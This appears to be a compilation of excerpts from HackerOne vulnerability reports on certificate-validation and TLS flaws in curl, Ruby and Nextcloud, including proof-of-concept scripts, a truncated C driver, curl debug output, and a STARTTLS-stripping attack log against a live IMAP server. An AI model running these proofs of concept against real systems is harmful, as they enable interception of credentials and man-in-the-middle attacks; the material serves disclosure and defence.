    port: 12345,
    ca: [fs.readFileSync("./server.crt")],
    key: fs.readFileSync("./client.key"),
    cert: fs.readFileSync("./client.crt")
}, () => {
    client.write("foo");
    client.end();
});
client.on("data", () => undefined);
client.on("error", () => undefined);
client.on("end", () => undefined);
```

```
-----BEGIN CERTIFICATE-----
MIIDezCCAmOgAwIBAgIJAPP+kRMqzgNDMA0GCSqGSIb3DQEBCwUAMFQxCzAJBgNV
BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX
aWRnaXRzIFB0eSBMdGQxDTALBgNVBAMMBG15Y2EwHhcNMTkxMTI2MTUxNjEwWhcN
MjAxMTI1MTUxNjEwWjBUMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0
ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMQ0wCwYDVQQDDARt
eWNhMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmK5z7YRTmxYEhm3/
lDrvJWiqsBS3fiq79YSfHlNIbVhgE6ObTTl2WOHJWU/Mw2dKr7l2/fL2R+7O98rt
MfI26aet5r73eu/4Kd/11mRUZ6CSAtzIaP+L7i4dRqR+XOfYTMEbi//Kuh2EvBha
cgB2jFaG1duu/bqTM1In7vKzJEUREd/EoYYBjt4UC5r6mIZ+CqYarfSmOGJ8BXGA
bewesTjqBoJ5DjsZzHkY7BdJzrD9OvCs9XChxeYfaojSGvs5gUJHEhFM6/G1xipv
Qr1VK0aADths9hQnV/8pj1dZLJqvEqEjqct16/CdVjI7B+xBTmhAvL43rxTar/EH
thmt7wIDAQABo1AwTjAdBgNVHQ4EFgQUSe33PfECxbQKWq5XfHj14xNcUsAwHwYD
VR0jBBgwFoAUSe33PfECxbQKWq5XfHj14xNcUsAwDAYDVR0TBAUwAwEB/zANBgkq
hkiG9w0BAQsFAAOCAQEAEDQAzjx4r+2Z1YaCIbToyD+BMuv250Tiwd4MrvKOx7LT
opnWwqn50KtLOfPCd+peNfsxOy9OCC+PqVnOKTnTIOOtv49pRsG3f1SmFjzHfPOC
tL0n7M4WGHDW0ITbuZWhmOMpeiQQLF45p2lcXT49vllRpta86501f+jUW/47nQfU
pGjk4Qbw18jXrAe1qsedisKL9VWdaj1Quxd0XVV2w7kGw6cHBlTNyJd+UeyczheQ
xM7svOeuCMLRMFusxq8Lo6CAwbNiSa/GW7AErHjtruinl9pJXn3FVUvYz9tJ4OrB
ErCfVLYzVDrohIGYS4PMmypx1Bxhlg5JIyoR3JRUuQ==
-----END CERTIFICATE-----
```

## #3966955 TLS session cache case-folds CA paths and bypasses the active trust profile — curl — - — Improper Certificate Validation
Source: `hackerone/reports/2026/3966955.md` (https://hackerone.com/reports/3966955)

```
    cert controls: good_rc=0 bad_rc=2
    run1 case-only bad CA: rc=0 reused=True canary_sent=True http_200=2
    run2 case-only bad CA: rc=0 reused=True canary_sent=True http_200=2
    control different-name bad CA: rc=60 reused=False canary_sent=False http_200=1
```

## #3295650 Exposure of Hard-coded Private Keys and Credentials in curl Source Repository (CWE-321) — curl — - — Use of Hard-coded Cryptographic Key
Source: `hackerone/reports/2025/3295650.md` (https://hackerone.com/reports/3295650)

```
    Clone the curl repository: git clone https://github.com/curl/curl.git
    Run a secret scanning tool (e.g., gitleaks detect --source=.) to identify hard-coded secrets.
    Alternatively, search for likely private key and credential strings with:
        grep -r '-----BEGIN' ./tests/
        grep -r 'password' ./docs/examples/
    Review identified files to confirm the presence of full private keys or functional credential examples, such as tests/data/testprivkey.pem or docs/examples/http-auth-example.txt.
    See .gitleaks/report.json for a consolidated findings report.
```

```
    Example evidence: tests/data/testprivkey.pem containing full private key
    Example evidence: docs/examples/http-auth-example.txt with plaintext credentials
    Full scan log: .gitleaks/report.json (generated via gitleaks)
    curl/curl GitHub repository
    Screenshot evidence as required (available on request)
```

```
    Impersonation & Privilege Escalation: Attackers can use leaked private keys to impersonate curl services, developers, or automated systems, gaining unauthorized access to protected infrastructure or code-signing processes.
    Data Decryption: If any of the exposed keys have been (or are) used in production, an attacker could decrypt sensitive traffic or files, leading to data breaches.
    Credential Stuffing & Service Hijack: Exposed example/test credentials may be reused in production or CI/CD, allowing attackers to pivot and escalate their access within targeted environments.
    Supply Chain Attacks: Malicious actors might leverage sensitive secrets to inject or distribute malicious builds of curl/libcurl or to poison official releases.
    Regulatory & Compliance Risks: This level of exposure may trigger mandatory breach reporting and legal or regulatory actions, especially for downstream consumers subject to compliance standards.
```

## #387250 OpenSSL::X509::Name Equality Check Does Not Work, Patch included — ruby — - — Improper Certificate Validation
Source: `hackerone/reports/2018/387250.md` (https://hackerone.com/reports/387250)

```
     result = ossl_x509name_cmp0(self, other);
     if (result < 0) return INT2FIX(-1);
```

```
     name0 = OpenSSL::X509::Name.new([["DC", "org"], ["DC", "ruby-lang"], ["CN", "bar.ruby-lang.org"]])
     name1 = OpenSSL::X509::Name.new([["DC", "org"], ["DC", "ruby-lang"], ["CN", "bar.ruby-lang.org"]])
     name2 = OpenSSL::X509::Name.new([["DC", "org"], ["DC", "ruby-lang"], ["CN", "baz.ruby-lang.org"]])
```

```
     assert_equal true, name0 == name1
     assert_equal true, name0.eql?(name1)
```

## #3993973 HTTP Digest nonce reused across an https→http scheme change on the same handle — curl — - — None
Source: `hackerone/reports/2026/3993973.md` (https://hackerone.com/reports/3993973)

```
// lib/http_digest.c:38-62
static void digest_flush_stale(struct Curl_easy *data,
                               struct digestdata *digest,
                               struct Curl_peer *peer,
                               struct Curl_creds *creds)
{
  bool flush = FALSE;
  if(digest->origin && !Curl_peer_same_destination(peer, digest->origin)) {
    ...
    flush = TRUE;
  }
  else if(digest->creds && !Curl_creds_same(creds, digest->creds)) {
    ...
    flush = TRUE;
  }
  if(flush)
    Curl_auth_digest_cleanup(digest);

  Curl_peer_link(&digest->origin, peer);
  Curl_creds_link(&digest->creds, creds);
}
```

```
#!/bin/sh
# Usage:
#   ./run.sh exploit   # same creds on both transfers -> nonce reused -> LEAK
#   ./run.sh control   # different creds on 2nd xfer   -> flushed     -> no leak
set -e
MODE="${1:-exploit}"
PORT="${PORT:-18443}"
RUNDIR="${TMPDIR:-/tmp}/digest-scheme-poc-$$"
CERT="$RUNDIR/cert.pem"
KEY="$RUNDIR/key.pem"
MARKER="$RUNDIR/leak-marker"
READY="$RUNDIR/srv-ready"
mkdir -p "$RUNDIR"
cleanup() {
  [ -n "$SRV" ] && { kill "$SRV" 2>/dev/null; wait "$SRV" 2>/dev/null || true; }
  rm -rf "$RUNDIR"
}

openssl req -x509 -newkey rsa:2048 -keyout "$KEY" -out "$CERT" \
  -days 3650 -nodes -subj "/CN=127.0.0.1" >/dev/null 2>&1

cat > "$RUNDIR/drv.c" <<'C'
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static size_t wr(void *p, size_t s, size_t n, void *u) {
  (void)p; (void)u;
  return s * n;
}

int main(int argc, char **argv) {
  const char *mode = (argc > 1) ? argv[1] : "exploit";
  const char *port = getenv("PORT");
  if (!port) port = "18443";
  char hs[256], hp[256];
  snprintf(hs, sizeof hs, "https://127.0.0.1:%s/", port);
  snprintf(hp, sizeof hp, "http://127.0.0.1:%s/", port);

  curl_global_init(CURL_GLOBAL_DEFAULT);
  CURL *h = curl_easy_init();
  curl_easy_setopt(h, CURLOPT_WRITEFUNCTION, wr);
  curl_easy_setopt(h, CURLOPT_SSL_VERIFYPEER, 0L);
  curl_easy_setopt(h, CURLOPT_SSL_VERIFYHOST, 0L);
  curl_easy_setopt(h, CURLOPT_HTTPAUTH, (long)CURLAUTH_DIGEST);

  /* transfer 1: https, obtains and caches the Digest nonce */
  curl_easy_s
```

```
GET / HTTP/1.1
Host: 127.0.0.1:18443
Authorization: Digest username="alice", realm="testrealm", nonce="deadbeefcafe1234", uri="/", cnonce="...", nc=00000002, qop=auth, response="..."
```

## #2410774 CVE-2024-2379: QUIC certificate check bypass with wolfSSL — curl — - — Improper Certificate Validation
Source: `hackerone/reports/2024/2410774.md` (https://hackerone.com/reports/2410774)

```
./curl -v --http3-only 'https://example.com/' -o /dev/null -s --resolve example.com:443:192.168.1.24 --curves blah
* Added example.com:443:192.168.1.24 to DNS cache
* Hostname example.com was found in DNS cache
*   Trying 192.168.1.24:443...
* wolfSSL failed to set curves
* Verified certificate just fine
* Connected to example.com (192.168.1.24) port 443
* using HTTP/3
* [HTTP/3] [0] OPENED stream for https://example.com/
* [HTTP/3] [0] [:method: GET]
* [HTTP/3] [0] [:scheme: https]
* [HTTP/3] [0] [:authority: example.com]
* [HTTP/3] [0] [:path: /]
* [HTTP/3] [0] [user-agent: curl/8.7.0-DEV]
* [HTTP/3] [0] [accept: */*]
> GET / HTTP/3
> Host: example.com
> User-Agent: curl/8.7.0-DEV
> Accept: */*
> 
* We are completely uploaded and fine
< HTTP/3 200 
< server: nginx/1.25.4
< date: Sun, 10 Mar 2024 21:02:39 GMT
< content-type: text/html
< content-length: 615
< last-modified: Wed, 14 Feb 2024 16:03:00 GMT
< etag: "65cce434-267"
< accept-ranges: bytes
< 
{ [615 bytes data]
* Connection #0 to host example.com left intact
```

```
./curl -v --http3-only 'https://example.com/' -o /dev/null -s --resolve example.com:443:192.168.1.24 
* Added example.com:443:192.168.1.24 to DNS cache
* Hostname example.com was found in DNS cache
*   Trying 192.168.1.24:443...
*  CAfile: /etc/ssl/certs/ca-certificates.crt
*  CApath: none
* QUIC connect to 192.168.1.24 port 443 failed: SSL peer certificate or SSH remote key was not OK
* Failed to connect to example.com port 443 after 12 ms: SSL peer certificate or SSH remote key was not OK
* Closing connection
```

## #2961050 curl allows SSH connection even if host is not in known_hosts — curl — - — Improper Certificate Validation
Source: `hackerone/reports/2025/2961050.md` (https://hackerone.com/reports/2961050)

```
              For SFTP and SCP, this option makes curl skip the known_hosts
              verification.  known_hosts is a file normally stored in the
              user's home directory in the ".ssh" subdirectory, which contains
              hostnames and their public keys.
```

```
$ curl --user foo sftp://localhost:2222
Enter host password for user 'foo':
Warning: Couldn't find a known_hosts file
curl: (67) Login denied
```

```
INFO:root:[pass] Authenticated username foo password bar
```

## #3418776 Silent TLS Trust Model Hijacking via `CURL_CA_BUNDLE` Environment Variable Leads to MITM — curl — - — Improper Certificate Validation
Source: `hackerone/reports/2025/3418776.md` (https://hackerone.com/reports/3418776)

```
       * Login Credentials (Username, Password)
       * API Keys and Authentication Tokens (Bearer Tokens)
       * Session Cookies
       * Personal and Financial Data
       
```

## #1699740 nextcloudcmd incorrectly trusts bad TLS certificates — nextcloud — - — Improper Certificate Validation
Source: `hackerone/reports/2022/1699740.md` (https://hackerone.com/reports/1699740)

```
# nextcloudcmd --non-interactive -n ~/Nextcloud https://nextcloud.lan
09-10 12:25:54:348 [ info nextcloud.sync.accessmanager ]:	2 "" "https://nextcloud.lan/ocs/v1.php/cloud/capabilities?format=json" has X-Request-ID "18ff47a0-a482-4456-a489-7aa747170c58"
09-10 12:25:54:348 [ info nextcloud.sync.networkjob ]:	OCC::JsonApiJob created for "https://nextcloud.lan" + "ocs/v1.php/cloud/capabilities" ""
09-10 12:25:54:545 [ info nextcloud.sync.account ]:	"SSL-Errors happened for url  \"https://nextcloud.lan/ocs/v1.php/cloud/capabilities?format=json\" \tError in  QSslCertificate(\"3\", [REDACTED] : \"The root certificate of the certificate chain is self-signed, and untrusted\" ( \"The root certificate of the certificate chain is self-signed, and untrusted\" ) \n " Certs are known and trusted! This is not an actual error.
09-10 12:25:54:871 [ info nextcloud.sync.networkjob.jsonapi ]:	JsonApiJob of QUrl("https://nextcloud.lan/ocs/v1.php/cloud/capabilities?format=json") FINISHED WITH STATUS "OK"
```

## #1178562 imap: StartTLS stripping attack (CVE-2016-0772). — ruby — - — Cryptographic Issues - Generic
Source: `hackerone/reports/2021/1178562.md` (https://hackerone.com/reports/1178562)

```
    def starttls(options = {}, verify = true)
      send_command("STARTTLS") do |resp|
        if resp.kind_of?(TaggedResponse) && resp.name == "OK"
          begin
            # for backward compatibility
            certs = options.to_str
            options = create_ssl_params(certs, verify)
          rescue NoMethodError
          end
          start_tls_session(options)
        end # <--- End of handling :)
      end
    end
```

```
require 'net/imap'

imap = Net::IMAP.new('0.0.0.0', 9999)
imap.starttls
imap.login('myLOGIN','myPASSWORD')                                            # test login
#imap.authenticate('LOGIN', 'joe_user', 'joes_password') # test auth
imap.disconnect
```

```
$  python striptls.py -l 0.0.0.0:9999 -r imap.yandex.ru:143 -x IMAP.StripWithError
2021-04-28 18:43:27,286 - INFO     - <Session 0x7fd5850b3c10> client ('127.0.0.1', 39154) has connected
2021-04-28 18:43:27,286 - INFO     - <Session 0x7fd5850b3c10> connecting to target ('imap.yandex.ru', 143)
2021-04-28 18:43:27,347 - DEBUG    - <Session 0x7fd5850b3c10> [client] <= [server]          '* OK Yandex IMAP4rev1 at myt3-8d2078fedea5.qloud-c.yandex.net:143 ready to talk with ::ffff:188.138.209.162:62549, 2021-Apr-28 18:43:52, qheZ7J3friE1\r\n'
2021-04-28 18:43:27,348 - DEBUG    - <RewriteDispatcher  - changed mangle: __main__.StripWithError new: True>
2021-04-28 18:43:27,348 - DEBUG    - <Session 0x7fd5850b3c10> [client] => [server]          'RUBY0001 STARTTLS\r\n'
2021-04-28 18:43:27,349 - DEBUG    - <Session 0x7fd5850b3c10> [client] <= [server][mangled] 'RUBY0001 BUG unhandled command\r\n'
2021-04-28 18:43:27,349 - DEBUG    - <Session 0x7fd5850b3c10> [client] => [server][mangled] None
2021-04-28 18:43:27,349 - DEBUG    - <Session 0x7fd5850b3c10> [client] => [server]          'RUBY0002 LOGIN myLOGIN myPASSWORD\r\n'
...
```

